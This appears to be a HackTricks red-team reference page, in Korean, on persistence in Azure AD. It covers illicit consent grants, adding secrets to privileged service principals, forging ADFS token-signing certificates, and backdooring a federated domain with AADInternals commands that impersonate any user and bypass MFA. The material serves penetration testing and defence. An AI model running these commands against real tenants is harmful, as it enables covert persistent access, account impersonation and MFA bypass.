# Az - 지속성

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

### 불법 동의 부여

기본적으로 모든 사용자는 Azure AD에서 애플리케이션을 등록할 수 있습니다. 따라서 대상 테넌트에 대해 고도의 영향을 미치는 권한이 필요한 애플리케이션을 등록할 수 있습니다. 이를 통해 사용자 대신 메일 보내기, 역할 관리 등의 작업을 수행할 수 있는 **피싱 공격**을 실행할 수 있습니다. 이러한 공격은 성공할 경우 매우 **성과가 좋을 것**입니다.

또한, 해당 애플리케이션을 사용자로서 수락함으로써 액세스를 유지할 수도 있습니다.

### 애플리케이션 및 서비스 주체

Application Administrator, GA 또는 microsoft.directory/applications/credentials/update 권한을 가진 사용자로서, 기존 애플리케이션에 자격 증명(비밀 또는 인증서)을 추가할 수 있습니다.

고 권한을 가진 애플리케이션을 **대상으로 지정**하거나 고 권한을 가진 **새로운 애플리케이션**을 추가할 수 있습니다.

애플리케이션에 추가할 수 있는 흥미로운 역할은 **Privileged authentication administrator role**입니다. 이 역할은 Global Administrators의 **비밀번호 재설정**을 허용합니다.

이 기술은 또한 **MFA 우회**를 가능하게 합니다.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* 인증서 기반 인증을 위해

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### 연합 - 토큰 서명 인증서

온프레미스 AD에서 **DA 권한**을 가지고 있다면, 매우 긴 유효 기간을 가진 **새로운 토큰 서명** 및 **토큰 복호화 인증서**를 생성하고 가져올 수 있습니다. 이를 통해 우리는 ImuutableID를 알고 있는 **어떤 사용자로든 로그인**할 수 있습니다.

다음 명령을 **ADFS 서버의 DA로 실행**하여 새 인증서를 생성하고 (기본 암호 'AADInternals' 사용), ADFS에 추가하고 자동 롤오버를 비활성화하고 서비스를 다시 시작합니다.
```powershell
New-AADIntADFSSelfSignedCertificates
```
그런 다음 Azure AD로 인증서 정보를 업데이트하십시오:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### 연합 - 신뢰하는 도메인

테넌트에서 GA 권한을 가지고 있다면, **새 도메인을 추가**할 수 있으며 (검증되어야 함), 인증 유형을 연합으로 구성하고 도메인을 **특정 인증서** (아래 명령어의 any.sts)와 발급자를 신뢰하도록 구성할 수 있습니다.
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## 참고 자료

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>
